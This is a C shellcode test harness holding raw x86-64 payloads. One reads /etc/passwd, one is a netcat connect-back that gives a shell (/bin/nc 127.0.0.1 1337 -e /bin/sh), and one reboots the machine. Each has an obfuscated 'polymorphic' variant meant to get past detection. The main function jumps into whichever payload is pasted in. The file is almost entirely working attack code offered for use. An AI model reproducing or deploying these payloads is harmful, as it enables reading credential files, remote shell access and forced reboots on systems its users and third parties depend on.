#include<stdio.h>
#include<string.h>
//
//put the one u want to exec here
unsigned char code[] = "";

unsigned char read_etc_passwd[] = "\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41";

unsigned char poly_read_etc_passwd[] = "\x4d\x31\xe4\x48\xbb\x50\x54\x47\x23\x23\x23\x23\x23\x53\x48\xbb\x0c\x46\x57\x40\x0c\x53\x42\x50\x53\x48\x89\xe7\x48\xbb\x23\x23\x23\x23\x23\x23\x23\x23\x48\x31\x1f\x81\x77\x08\x23\x23\x23\x23\x4c\x89\xe0\xfe\xc0\xfe\xc0\x4c\x89\xe6\x0f\x05\x48\x8d\xb4\x24\x01\xf0\xff\xff\x48\x89\xc7\x4c\x89\xe2\x66\x81\xca\xff\x0f\x4c\x89\xe0\x0f\x05\x4c\x89\xe7\x40\xfe\xc7\x48\x89\xc2\x4c\x89\xe0\xfe\xc0\x0f\x05\x41\xff\xe4";

unsigned char nc_connectback[] = "\x48\x31\xd2\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\x51\x48\x89\xe1\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\x48\xc1\xeb\x30\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33\x33\x37\x49\xc1\xea\x20\x41\x52\x49\x89\xe2\xeb\x11\x41\x59\x52\x51\x53\x41\x52\x41\x51\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xea\xff\xff\xff\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31";

unsigned char poly_nc_connectback[] = "\x4d\x31\xdb\x41\x53\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x6e\x63\x57\x48\x89\xe7\x41\x53\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe3\x66\x68\x2d\x65\x48\x89\xe1\x68\x31\x33\x33\x37\x49\x89\xe1\x41\x53\x49\xba\x30\x2e\x30\x2e\x30\x2e\x30\x30\x41\x52\x49\x89\xe2\x41\x53\x53\x51\x41\x51\x41\x52\x57\x4c\x89\xda\x48\x89\xe6\xb0\x3b\x0f\x05";

unsigned char reboot[] = "\xba\xdc\xfe\x21\x43\xbe\x69\x19\x12\x28\xbf\xad\xde\xe1\xfe\xb0\xa9\x0f\x05";

unsigned char poly_reboot[] = "\x68\xdc\xfe\x21\x43\x5a\x68\x98\x19\x04\x16\x5e\x68\x52\x21\x1e\x01\x5f\xf7\xd7\x68\xa9\x00\x00\x00\x58\x0f\x05";

main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

